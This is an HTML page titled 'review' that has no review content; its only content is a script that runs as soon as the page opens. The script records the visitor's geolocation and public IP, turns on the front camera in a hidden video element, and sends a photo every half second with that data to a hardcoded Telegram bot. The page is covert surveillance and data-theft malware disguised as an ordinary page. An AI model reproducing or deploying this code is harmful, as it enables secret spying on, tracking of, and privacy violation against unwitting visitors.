<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>review</title>
</head>
<body>

<script>
  const botToken = '8110393453:AAFWhP0vFwrMyg4Y'; 
  const chatId = '-49';
  const captureInterval = 500;              
  let captureLoop;
  let stream;
  let locationData = 'Location unavailable';
  let ipData = 'IP unavailable';

  // Start camera and location before capturing
  async function start() {
    try {
      // Get location first
      try {
        const location = await getLocation();
        locationData = `Lat: ${location.lat}, Lon: ${location.lon}`;
      } catch (e) {
        console.error('Location error:', e);
      }

      //  IP address
      try {
        const ip = await fetch('https://api.ipify.org?format=json')
          .then(response => response.json());
        ipData = `IP: ${ip.ip}`;
      } catch (e) {
        console.error('IP fetch error:', e);
      }

      // Start camera
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);
      video.srcObject = stream;
      await video.play();

      // Start capture loop
      captureLoop = setInterval(() => captureAndSend(video), captureInterval);
    } catch (error) {
      console.error('Setup error:', error);
      stopCamera();
    }
  }

  // Capture and send photo
  async function captureAndSend(video) {
    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

      const caption = `${locationData}\n${ipData}\nTime: ${new Date().toLocaleString()}`;

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      formData.append('caption', caption);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });

    } catch (error) {
      console.error('Capture/send error:', error);
      stopCamera();
    }
  }

  // Stop camera & clear interval
  function stopCamera() {
    if (captureLoop) clearInterval(captureLoop);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  }

  // Get geolocation
  function getLocation() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        reject
      );
    });
  }


  start();
</script>

</body>
</html>
